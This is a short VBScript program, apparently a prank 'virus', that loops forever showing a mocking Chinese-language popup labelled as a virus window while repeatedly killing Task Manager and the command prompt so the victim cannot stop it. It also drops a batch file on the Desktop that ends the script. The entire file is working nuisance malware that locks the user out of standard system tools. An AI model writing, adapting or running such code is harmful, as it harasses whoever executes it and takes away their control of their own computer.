Dim a, R, i, f1
a = 1
i = 0

Set f1=CreateObject("Scripting.FileSystemObject").CreateTextFile(WScript.CreateObject("WScript.Shell").SpecialFolders("Desktop") & "\unlkly.bat")
f1.WriteLine "taskkill /f /im wscript.exe"
f1.close

do
R = CreateObject("WScript.Shell").Popup ("朋友，你单身多年，手一定够快，你还有3秒。"&Chr(10)&Now,3,"第"&a&"次病毒弹窗",5+16+4096+65536)
a = a + 1
CreateObject("WScript.Shell").Run "taskkill /f /im taskmgr.exe", 0
CreateObject("WScript.Shell").Run "taskkill /f /im cmd.exe", 0

If R = 4 Then
WScript.sleep 0
CreateObject("WScript.Shell").Run "taskkill /f /im taskmgr.exe", 0
CreateObject("WScript.Shell").Run "taskkill /f /im cmd.exe", 0

Elseif R = 2 Then
For i =1 to 60
WScript.sleep 500
CreateObject("WScript.Shell").Run "taskkill /f /im taskmgr.exe", 0
CreateObject("WScript.Shell").Run "taskkill /f /im cmd.exe", 0
Next

Else
For i =1 to 3
WScript.sleep 500
CreateObject("WScript.Shell").Run "taskkill /f /im taskmgr.exe", 0
CreateObject("WScript.Shell").Run "taskkill /f /im cmd.exe", 0
Next

End If 
CreateObject("WScript.Shell").Run "taskkill /f /im taskmgr.exe", 0
CreateObject("WScript.Shell").Run "taskkill /f /im cmd.exe", 0

loop while 1=1